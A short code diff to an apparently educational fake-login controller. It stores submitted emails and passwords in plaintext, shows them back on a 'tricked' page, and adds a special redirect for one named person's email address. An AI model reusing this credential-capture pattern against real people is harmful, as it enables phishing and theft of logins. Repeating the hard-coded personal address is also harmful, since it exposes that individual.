@@ -16,6 +16,9 @@ class fakeController extends Controller
     	$fakeuser = new Fakeuser;
     	$fakeuser['email'] = $username;
     	$fakeuser['password'] = $password;
+        if($username == "koen.heylen@kdg.be"){
+            return redirect('https://goo.gl/forms/jZvtsYpBCYzkejtW2');
+        }
     	$fakeuser->save();
     	return view('tricked')->with('email', $username)->with('password', $password);
     }
